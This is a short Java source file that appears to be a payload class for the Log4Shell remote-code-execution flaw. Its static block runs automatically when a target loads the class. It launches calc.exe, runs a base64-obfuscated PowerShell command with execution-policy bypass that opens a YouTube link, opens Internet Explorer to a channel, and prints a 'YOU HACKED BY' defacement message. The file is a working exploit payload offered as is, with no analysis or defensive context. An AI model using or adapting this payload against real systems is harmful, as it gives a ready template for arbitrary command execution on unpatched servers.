public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("calc.exe").waitFor();
			java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc cwB0AGEAcgB0ACAAYwBoAHIAbwBtAGUAIABoAHQAdABwAHMAOgAvAC8AeQBvAHUAdAB1AC4AYgBlAC8AZABRAHcANAB3ADkAVwBnAFgAYwBRACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABtAGEAeABpAG0AaQB6AGUAZAANAAoA").waitFor();
			java.lang.Runtime.getRuntime().exec("powershell.exe -exec $ie_procinfo = Start-Process iexplore -ArgumentList 'youtube.com/sp0k1_n0k1' -passthru").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("AHAHAHAH YOU HACKED BY SP0K1_N0K1 & _KENAS");
    }
}
